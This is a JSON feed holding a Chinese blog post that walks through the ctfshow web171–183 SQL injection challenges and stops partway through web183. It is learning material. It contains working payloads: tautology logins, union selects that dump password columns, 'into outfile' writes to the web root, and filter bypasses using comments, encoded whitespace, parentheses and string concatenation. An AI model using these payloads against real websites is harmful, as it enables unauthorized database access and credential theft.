{
    "version": "https://jsonfeed.org/version/1",
    "title": "0110 0011 0111 1001 0110 0010 • All posts by \"sql注入\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2025/01/11/web/ctfshow_web(SQL%E6%B3%A8%E5%85%A5)/",
            "url": "https://vvwwvv.cn/2025/01/11/web/ctfshow_web(SQL%E6%B3%A8%E5%85%A5)/",
            "title": "ctfshow_web_()",
            "date_published": "2025-01-11T09:08:15.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"web171\"><a class=\"anchor\" href=\"#web171\">#</a> web171</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTExMTkzMjE4ODI2LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111193218826.png</span>&quot; alt=&quot;image-20250111193218826&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>这里有引号判断是 <code>字符型注入</code> ，<strong>and 优先级高于 or</strong>，所以先 <code>username !='flag' and id='0' </code> 再 <code>or username='flag'</code></p>\n<p>这里相当于 <code>'id'</code> 【不用管双引号】，看题目应该是要找到 <code>username=flag</code> ，可以把前面的判断为假，然后注入一个 <code>or</code>  来让后面为真：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">' or username =  '</span>flag <span class=\"token comment\">#这里 flag 后面不闭合上，因为原本语句最后会加上 `'`</span></pre></td></tr></table></figure><p>得到 flag：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111194009203.png\" alt=\"image-20250111194009203\" /></p>\n<h2 id=\"web172\"><a class=\"anchor\" href=\"#web172\">#</a> web172</h2>\n<p>直接打开看不见信息，查看源码可以找到：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTExMjE0NTA1NzAyLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111214505702.png</span>&quot; alt=&quot;image-20250111214505702&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>访问 <code>url/select-no-waf-2.php</code></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTExMjE0NjA3MTQ5LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250111214607149.png</span>&quot; alt=&quot;image-20250111214607149&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>这里应该是将返回值带有 flag 的给屏蔽了，本想直接匹配 <code>password = 'ctf%'</code> ，但是也没有</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">' or password='</span>ctf<span class=\"token operator\">%</span>' <span class=\"token comment\">--+  #这里应该是找到了 flag，但是由于返回的字段带有 flag 所以不显示</span></pre></td></tr></table></figure><p>采用 <code>联合查询union</code> ，要保证前后查询列数相同，不能查询 <code>username</code> ，所以查询 <code>id</code>  和 <code>password</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' union select id , password from ctfshow_user2 --+  #后面没加where条件，所以这里会显示所有的项，由于项数大于1，因此要用 `--+`注释掉后面的limit 1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>#后面发现可以加上限制条件：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> id <span class=\"token punctuation\">,</span> password <span class=\"token keyword\">from</span> ctfshow_user2 <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">'flag'</span> <span class=\"token comment\">--+ #这里只是找出有 flag 的项，但不显示 username，只有 id 和 password</span></pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTE1NjI0MjYzLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112115624263.png</span>&quot; alt=&quot;image-20250112115624263&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<h2 id=\"web173\"><a class=\"anchor\" href=\"#web173\">#</a> web173</h2>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112133612446.png\" alt=\"image-20250112133612446\" /></p>\n<p>这次还是过滤了返回的 flag，利用 <code>联合注入union</code> ，不过<strong>注意：这里前面 select 的字段名是三个</strong>，因此联合注入的字段也需要是三个才能正确显示：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' union select 1, id ,password from ctfshow_user3 where username='</span>flag' <span class=\"token comment\">--+</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112133833745.png\" alt=\"image-20250112133833745\" /></p>\n<h2 id=\"web174\"><a class=\"anchor\" href=\"#web174\">#</a> web174</h2>\n<p>一开始进去发现数据库一直异常，查看源码发现，给的页面是 waf3 的，手动访问 waf4</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112143308569.png\" alt=\"image-20250112143308569\" /></p>\n<p>把数字给过滤了，要把回显的数字给替换成字母，为了不在还原的时候把原本 flag 的字母给还原成数字，这里就要把数字给替换成大写字母：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' union select '</span>a<span class=\"token string\">',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'</span><span class=\"token number\">1</span><span class=\"token string\">','</span>A<span class=\"token string\">'),'</span><span class=\"token number\">2</span><span class=\"token string\">','</span>B<span class=\"token string\">'),'</span><span class=\"token number\">3</span><span class=\"token string\">','</span>C<span class=\"token string\">'),'</span><span class=\"token number\">4</span><span class=\"token string\">','</span>D<span class=\"token string\">'),'</span><span class=\"token number\">5</span><span class=\"token string\">','</span>E<span class=\"token string\">'),'</span><span class=\"token number\">6</span><span class=\"token string\">','</span>F<span class=\"token string\">'),'</span><span class=\"token number\">7</span><span class=\"token string\">','</span>G<span class=\"token string\">'),'</span><span class=\"token number\">8</span><span class=\"token string\">','</span>H<span class=\"token string\">'),'</span><span class=\"token number\">9</span><span class=\"token string\">','</span>I<span class=\"token string\">'),'</span><span class=\"token number\">0</span><span class=\"token string\">','</span>J<span class=\"token string\">'),'</span>g<span class=\"token string\">','</span>K'<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> ctfshow_user4 <span class=\"token comment\">--+</span></pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTQzNTMzODcxLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112143533871.png</span>&quot; alt=&quot;image-20250112143533871&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>接着还原：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">text</span><span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow&#123;JJACCJdA-JbaG-DHbc-aEfH-GBCIFJICBeAA&#125;\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'D'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'G'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'H'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'I'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'J'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'K'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112143649430.png\" alt=\"image-20250112143649430\" /></p>\n<h2 id=\"web175\"><a class=\"anchor\" href=\"#web175\">#</a> web175</h2>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112162807516.png\" alt=\"image-20250112162807516\" /></p>\n<p>过滤了所有 ascii 码，正常回显行不通，这里将输出的数据<strong>指定输出位置</strong>然后查看就行（利用 <code>into outfile</code> ）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' union select username,passowrd from ctfshow_user5 into outfile '</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>flag<span class=\"token punctuation\">.</span>txt' <span class=\"token comment\">--+</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112163529024.png\" alt=\"image-20250112163529024\" /></p>\n<p>接着访问 <code>url/flag.txt</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112163552641.png\" alt=\"image-20250112163552641\" /></p>\n<h2 id=\"web176\"><a class=\"anchor\" href=\"#web176\">#</a> web176</h2>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112164126965.png\" alt=\"image-20250112164126965\" /></p>\n<p>对参数进行了过滤，需要慢慢试【看 wp 知道是过滤了 <code>select</code> ，可大写绕过 <code>Select</code> 】，我这直接注入就得到了 flag</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">' or username='</span>flag' <span class=\"token comment\">--+</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112164357015.png\" alt=\"image-20250112164357015\" /></p>\n<h2 id=\"web177\"><a class=\"anchor\" href=\"#web177\">#</a> web177</h2>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112164731518.png\" alt=\"image-20250112164731518\" /></p>\n<p>万能密码试试</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span>' <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">--+ #发现回显是无数据</span></pre></td></tr></table></figure><figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">' or username='</span>flag' <span class=\"token comment\">--+ #也不回显</span></pre></td></tr></table></figure><p>接下来试了好多，报错注入，联合注入，布尔盲注，都没有回显，也不报错，用时间注入也不行</p>\n<p>最后看 wp，发现是过滤了 <code>空格</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' and '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> <span class=\"token comment\">#不能正常显示应该是有过滤。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">'||'</span><span class=\"token number\">1</span>    <span class=\"token comment\">#若可以正常显示，那么应该是过滤了空格或者 and （因为上面只有空格和 and 不一致）</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">'and'</span><span class=\"token number\">1</span>   <span class=\"token comment\">#没有问题，则就是过滤了空格</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#用 /**/ 绕过空格过滤（/**/ 替换空格）：</span></pre></td></tr></table></figure><p><strong>payload1：</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">'/**/union/**/select/**/id,username,password/**/from/**/ctfshow_user/**/where/**/username='</span>flag<span class=\"token string\">'%23 #'</span><span class=\"token comment\">#这里最后的注释符如果是 --+ 会无法成功，可能把 `+` 当作空格了</span></pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTgzODUzNTkwLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112183853590.png</span>&quot; alt=&quot;image-20250112183853590&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p><strong>payload2:</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">'/**/or/**/username='</span>flag'<span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h2 id=\"web178\"><a class=\"anchor\" href=\"#web178\">#</a> web178</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTg0NTUzOTI4LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112184553928.png</span>&quot; alt=&quot;image-20250112184553928&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n<p>试了一下，还是把空格过滤了，用 <code>/**/</code>  代替空格发现不行，用空格 url 编码 <code>%0d%0a</code>  发现可以绕过，有回显</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">'%0d%0aand%0d%0a'</span><span class=\"token number\">1</span> <span class=\"token comment\">#1' and '1</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112185250368.png\" alt=\"image-20250112185250368\" /></p>\n<p>构造 payload:</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">'%0d%0aor%0d%0ausername='</span>flag</pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTg1NDI3NDkxLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112185427491.png</span>&quot; alt=&quot;image-20250112185427491&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<h2 id=\"web179\"><a class=\"anchor\" href=\"#web179\">#</a> web179</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTg1OTUzMDk1LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112185953095.png</span>&quot; alt=&quot;image-20250112185953095&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>还是过滤了 <code>空格</code> ，然后 <code>%0d%0a·</code> 行不通了， <code>%0b</code> 、 <code>%09</code>  都被过滤了</p>\n<p>用不带空格的万能密码，得到 flag:</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string\">'or'</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span>'<span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112190735792.png\" alt=\"image-20250112190735792\" /></p>\n<h2 id=\"web180\"><a class=\"anchor\" href=\"#web180\">#</a> web180</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkxMzIwMjE4LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112191320218.png</span>&quot; alt=&quot;image-20250112191320218&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>过滤了空格，但是没有过滤 <code>%0c</code> ，构造 payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">'%0cor%0cusername='</span>flag'<span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><p>不行， <code>%23</code>  也被过滤了，去掉自己闭合的，得到 flag：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">'%0cor%0cusername='</span>flag</pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkxNzQ4MDYxLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112191748061.png</span>&quot; alt=&quot;image-20250112191748061&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<h2 id=\"web181\"><a class=\"anchor\" href=\"#web181\">#</a> web181</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkzMTA2MjMxLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112193106231.png</span>&quot; alt=&quot;image-20250112193106231&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>把所有空格的绕过基本上都过滤了，注释符也过滤了，尝试用 <code>+</code>  或者 <code>()</code>  绕过</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">'+and+'</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> <span class=\"token comment\">#行不通</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">'or(username)='</span>flag <span class=\"token comment\">#得到 flag</span></pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTkzODQ4NDcwLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112193848470.png</span>&quot; alt=&quot;image-20250112193848470&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<h2 id=\"web182\"><a class=\"anchor\" href=\"#web182\">#</a> web182</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTk0NDAzNzA1LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112194403705.png</span>&quot; alt=&quot;image-20250112194403705&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>多过滤了个关键字 <code>flag</code> , 没关系，用 <code>%</code>  作为通配符来匹配就行</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token string\">'or(username)like'</span>fla<span class=\"token operator\">%</span><span class=\"token string\">'--%01 #不能用`=`，要用like</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-1'</span><span class=\"token operator\">or</span><span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>concat<span class=\"token punctuation\">(</span><span class=\"token string\">'fl'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">and</span><span class=\"token string\">'a'</span><span class=\"token operator\">=</span><span class=\"token string\">'a  #拼接出flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>0'</span><span class=\"token operator\">or</span><span class=\"token string\">'1'</span><span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token comment\">--%01 #也可以得到 flag</span></pre></td></tr></table></figure><p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTk1NzMxNzYyLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112195731762.png</span>&quot; alt=&quot;image-20250112195731762&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<h2 id=\"web183\"><a class=\"anchor\" href=\"#web183\">#</a> web183</h2>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMjAwMjM1MzA0LnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112200235304.png</span>&quot; alt=&quot;image-20250112200235304&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n<p>这里的 <code>&quot;&quot;双引号</code> 与 post 是一个整体，这里是一个整形注入</p>\n<p>前几道题用户表名是 <code>ctfshow_user</code>  开头，这里试试，看可以查出结果：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEzMTMzNDE3OTMwLnBuZw==\">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250113133417930.png</span>&quot; alt=&quot;image-20250113133417930&quot; style=&quot;zoom:80%;&quot; /&gt;</p>\n<p>题目里查询语句的 <code>conunt(pass)</code> ， <code>pass</code>  就是字段名，利用 like 匹配一下看看有没有 flag</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tableName<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>ctfshow_user<span class=\"token punctuation\">)</span><span class=\"token keyword\">where</span><span class=\"token punctuation\">(</span>pass<span class=\"token punctuation\">)</span><span class=\"token operator\">like</span>'ctfshow</pre></td></tr></table></figure>",
            "tags": [
                "web"
            ]
        }
    ]
}